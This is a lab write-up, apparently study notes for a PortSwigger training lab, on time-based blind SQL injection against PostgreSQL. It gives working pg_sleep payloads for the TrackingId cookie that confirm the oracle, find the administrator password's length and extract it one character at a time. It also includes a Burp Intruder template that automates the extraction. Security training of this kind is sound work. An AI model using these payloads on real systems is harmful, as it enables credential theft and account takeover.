# Lab 15 — Blind SQL injection with time delays and information retrieval

| | |
|---|---|
| **Difficulty** | 🟨 Practitioner |
| **Category** | Blind SQLi (time) |
| **Concept** | [11 — Time-based blind SQLi](https://portswigger.net/web-security/sql-injection) |
| **PortSwigger** | https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval |

---

## 🎯 Objective
Using **conditional time delays**, extract the `administrator` password from the `TrackingId` injection and **log in**. Engine: **PostgreSQL**.

## 🧠 Background
Extend Lab 14: wrap `pg_sleep` in a `CASE` so the delay fires **only when a condition is TRUE**. "Slow response = TRUE" becomes the oracle for a binary/linear search over each password character.

## 🪜 Methodology
1. **Confirm the conditional-delay oracle**:
   ```sql
   TrackingId=xyz'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--   → ~10s (TRUE)
   TrackingId=xyz'%3BSELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--   → fast (FALSE)
   ```
   (`%3B` = `;` to stack a statement.)
2. **Confirm admin user**:
   ```sql
   TrackingId=xyz'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
   ```
3. **Find the length**:
   ```sql
   TrackingId=xyz'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
   ```
4. **Extract each character** (delay = correct guess):
   ```sql
   TrackingId=xyz'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
   ```

## 💥 Intruder template
```sql
TrackingId=xyz'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
```
- Attack type **Cluster bomb**; positions `1..20`, charset `a-z0-9`.
- In Intruder **Columns**, add **Response received** (timing). Sort by time — the slow rows reveal each character.

## ✅ Why it works
The delay only occurs when the guessed character matches, so response time encodes one bit of the secret per request. Iterating positions reconstructs the full password.

## 🛡️ Remediation
See [16 — Prevention](https://portswigger.net/web-security/sql-injection).

## 🔑 Takeaway
Conditional `pg_sleep` + timing = full data exfiltration with no visible output. `#sqli` `#practitioner` `#blind` `#time-based`
